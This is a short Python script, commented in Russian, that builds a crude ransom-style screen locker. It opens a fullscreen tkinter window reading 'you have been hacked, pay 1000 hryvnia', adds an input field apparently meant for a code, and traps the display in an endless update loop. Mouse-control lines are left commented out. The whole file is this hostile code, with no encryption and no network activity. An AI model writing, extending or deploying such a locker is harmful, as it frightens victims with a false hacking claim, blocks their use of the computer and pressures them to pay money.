import pyautogui
import tkinter
import time

# создаем окно
root = tkinter.Tk()

# добавляет текст
text = tkinter.Label(root, text='вас взломали плати 1000 гривень', font=1)
# размещает в сетке текст
text.grid(row=0, column=0)

# добававляет поле для ввода
input_text = tkinter.Entry(root, font=1)
# width, height - длина  и высота, x y - куда поместить 
input_text.place(width=500, height=50, x=100, y=100)

# найстройка на полный экран
root.attributes('-fullscreen', True)

while True:
    # обновляем окно
    root.update()

# перемещает
#pyautogui.moveTo(683, 384)

# кликает
#pyautogui.click()

